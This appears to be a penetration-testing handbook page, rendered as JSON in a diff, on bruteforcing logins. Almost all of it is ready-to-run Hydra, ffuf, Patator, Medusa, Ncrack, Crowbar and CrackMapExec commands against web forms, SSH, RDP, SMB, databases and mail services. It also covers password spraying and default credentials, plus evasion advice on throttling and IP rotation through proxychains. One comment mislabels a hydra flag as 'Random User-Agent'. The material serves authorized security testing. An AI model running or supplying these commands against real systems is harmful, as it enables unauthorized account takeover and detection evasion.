@@ -1,0 +1,295 @@
+{
+    "title": "Bruteforcing",
+    "breadcrumb": [
+        {
+            "title": "Enumeration",
+            "url": "/enumeration"
+        },
+        {
+            "title": "Web Attacks",
+            "url": "/enumeration/web"
+        }
+    ],
+    "sections": [
+        {
+            "heading": "Password Identification",
+            "type": "code_block",
+            "content": [
+                "# Identify hash type",
+                "hash-identifier",
+                "",
+                "# Name That Hash (better)",
+                "# https://github.com/HashPals/Name-That-Hash",
+                "nth --text \"5f4dcc3b5aa765d61d8327deb882cf99\"",
+                "",
+                "# hashid",
+                "hashid -m '$2a$10$...'  # Shows hashcat mode"
+            ]
+        },
+        {
+            "heading": "Wordlist Generation",
+            "type": "code_block",
+            "content": [
+                "# CeWL - Generate wordlist from target website",
+                "cewl https://target.com -d 3 -m 5 -w custom_wordlist.txt",
+                "cewl https://target.com --with-numbers -d 3 -w wordlist.txt",
+                "",
+                "# Generate password variations",
+                "# https://github.com/edoardottt/longtongue",
+                "python3 longtongue.py -w base_words.txt -o passwords.txt",
+                "",
+                "# Username wordlist from names",
+                "# https://github.com/AhmedMohamedDev/namemash.py",
+                "python namemash.py names.txt > usernames.txt"
+            ]
+        },
+        {
+            "heading": "HTTP Bruteforcing",
+            "subheadings": [
+                {
+                    "heading": "Hydra",
+                    "type": "code_block",
+                    "content": [
+                        "# HTTP GET Form",
+                        "hydra -L users.txt -P passwords.txt target.com http-get-form \\",
+                        "  \"/login:username=^USER^&password=^PASS^:F=Invalid credentials\"",
+                        "",
+                        "# HTTP POST Form",
+                        "hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form \\",
+                        "  \"/login:user=^USER^&pass=^PASS^:F=Login failed\" -V",
+                        "",
+                        "# HTTPS POST Form",
+                        "hydra -l admin -P passwords.txt target.com -s 443 -S https-post-form \\",
+                        "  \"/login:username=^USER^&password=^PASS^:F=Incorrect\"",
+                        "",
+                        "# Basic Auth",
+                        "hydra -L users.txt -P passwords.txt target.com http-get /admin",
+                        "",
+                        "# With cookies",
+                        "hydra -l admin -P passwords.txt target.com http-post-form \\",
+                        "  \"/login:user=^USER^&pass=^PASS^:F=failed:H=Cookie: session=abc123\""
+                    ]
+                },
+                {
+                    "heading": "ffuf",
+                    "type": "code_block",
+                    "content": [
+                        "# POST login form",
+                        "ffuf -w users.txt:USER -w passwords.txt:PASS \\",
+                        "  -u https://target.com/login \\",
+                        "  -X POST -d \"username=USER&password=PASS\" \\",
+                        "  -H \"Content-Type: application/x-www-form-urlencoded\" \\",
+                        "  -fc 401 -mc 200,302",
+                        "",
+                        "# With rate limiting",
+                        "ffuf -w passwords.txt -u https://target.com/login \\",
+                        "  -X POST -d \"user=admin&pass=FUZZ\" \\",
+                        "  -rate 10 -fc 401"
+                    ]
+                },
+                {
+                    "heading": "Patator",
+                    "type": "code_block",
+                    "content": [
+                        "# HTTP POST",
+                        "patator http_fuzz url=https://target.com/login method=POST \\",
+                        "  body='{\"user\":\"admin\",\"password\":\"FILE0\"}' \\",
+                        "  0=/path/to/passwords.txt \\",
+                        "  accept_cookie=1 follow=1 \\",
+                        "  -x ignore:fgrep='Invalid'",
+                        "",
+                        "# HTTP Basic Auth",
+                        "patator http_fuzz url=https://target.com/admin \\",
+                        "  user_pass=FILE0:FILE1 \\",
+                        "  0=users.txt 1=passwords.txt \\",
+                        "  -x ignore:code=401"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "Service Bruteforcing",
+            "subheadings": [
+                {
+                    "heading": "SSH",
+                    "type": "code_block",
+                    "content": [
+                        "hydra -l root -P passwords.txt ssh://target.com",
+                        "hydra -L users.txt -P passwords.txt target.com ssh -t 4",
+                        "",
+                        "# Medusa",
+                        "medusa -h target.com -u root -P passwords.txt -M ssh",
+                        "",
+                        "# Ncrack",
+                        "ncrack -p 22 --user root -P passwords.txt target.com"
+                    ]
+                },
+                {
+                    "heading": "RDP",
+                    "type": "code_block",
+                    "content": [
+                        "hydra -l administrator -P passwords.txt rdp://target.com",
+                        "ncrack -p 3389 --user administrator -P passwords.txt target.com",
+                        "",
+                        "# Crowbar (RDP specific)",
+                        "crowbar -b rdp -s target.com/32 -u admin -C passwords.txt -n 1"
+                    ]
+                },
+                {
+                    "heading": "FTP",
+                    "type": "code_block",
+                    "content": [
+                        "hydra -L users.txt -P passwords.txt ftp://target.com",
+                        "hydra -l anonymous -P passwords.txt target.com ftp"
+                    ]
+                },
+                {
+                    "heading": "SMB",
+                    "type": "code_block",
+                    "content": [
+                        "hydra -L users.txt -P passwords.txt smb://target.com",
+                        "crackmapexec smb target.com -u users.txt -p passwords.txt"
+                    ]
+                },
+                {
+                    "heading": "Database Services",
+                    "type": "code_block",
+                    "content": [
+                        "# MySQL",
+                        "hydra -l root -P passwords.txt mysql://target.com",
+                        "",
+                        "# PostgreSQL",
+                        "hydra -l postgres -P passwords.txt postgres://target.com",
+                        "",
+                        "# MSSQL",
+                        "hydra -l sa -P passwords.txt mssql://target.com",
+                        "",
+                        "# MongoDB",
+                        "nmap -p 27017 --script mongodb-brute target.com"
+                    ]
+                },
+                {
+                    "heading": "Other Services",
+                    "type": "code_block",
+                    "content": [
+                        "# SNMP",
+                        "hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp",
+                        "",
+                        "# SMTP",
+                        "hydra -l user@target.com -P passwords.txt smtp://target.com",
+                        "",
+                        "# POP3",
+                        "hydra -l user -P passwords.txt pop3://target.com",
+                        "",
+                        "# IMAP",
+                        "hydra -l user -P passwords.txt imap://target.com"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "Evasion Techniques",
+            "type": "code_block",
+            "content": [
+                "# Slow down requests",
+                "hydra -l admin -P passwords.txt target.com http-post-form \"/login:...\" -t 1 -w 3",
+                "",
+                "# Random User-Agent",
+                "hydra ... -e nsr  # Try null, same as login, reversed",
+                "",
+                "# IP rotation (via proxychains)",
+                "proxychains hydra -l admin -P passwords.txt target.com http-post-form \"/login:...\"",
+                "",
+                "# Add delays between requests",
+                "ffuf -w passwords.txt -u https://target.com/login -p 0.5-1.0"
+            ]
+        },
+        {
+            "heading": "Password Spraying",
+            "type": "code_block",
+            "content": [
+                "# Single password against many users",
+                "# https://github.com/x90skysn3k/brutespray",
+                "python brutespray.py --file nmap.gnmap -U users.txt -p 'Summer2024!' --threads 5",
+                "",
+                "# CrackMapExec for AD",
+                "crackmapexec smb dc.target.com -u users.txt -p 'Password123!' --continue-on-success",
+                "",
+                "# Spray single password",
+                "hydra -L users.txt -p 'Welcome1!' target.com http-post-form \"/login:...\""
+            ]
+        },
+        {
+            "heading": "Default Credentials",
+            "type": "code_block",
+            "content": [
+                "# Check common default credentials",
+                "# https://github.com/ihebski/DefaultCreds-cheat-sheet",
+                "# https://many-passwords.github.io/",
+                "",
+                "# Common defaults to try:",
+                "admin:admin",
+                "admin:password",
+                "root:root",
+                "test:test",
+                "guest:guest"
+            ]
+        },
+        {
+            "heading": "Wordlists",
+            "type": "code_block",
+            "content": [
+                "# Passwords",
+                "/usr/share/wordlists/rockyou.txt",
+                "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt",
+                "/usr/share/seclists/Passwords/darkweb2017-top10000.txt",
+                "",
+                "# Usernames",
+                "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
+                "/usr/share/seclists/Usernames/Names/names.txt"
+            ]
+        },
+        {
+            "heading": "Related Topics",
+            "type": "list",
+            "content": [
+                "Password Cracking - Hash cracking",
+                "Wordlist Reference - Wordlist selection guide"
+            ]
+        }
+    ],
+    "images": [
+        {
+            "description": "GitHub icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron down icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Hashtag icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron left icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron right icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
+        }
+    ],
+    "metadata": {
+        "last_updated": "2026-02-03T14:05:45.496Z",
+        "edit_url": "https://github.com/six2dez/pentest-book/blob/master/enumeration/web/bruteforcing.md",
+        "previous_page": {
+            "title": "Header injections",
+            "url": "/enumeration/web/header-injections"
+        },
+        "next_page": {
+            "title": "Online hashes cracked",
+            "url": "/enumeration/web/online-hashes-cracked"
+        }
+    }
+}
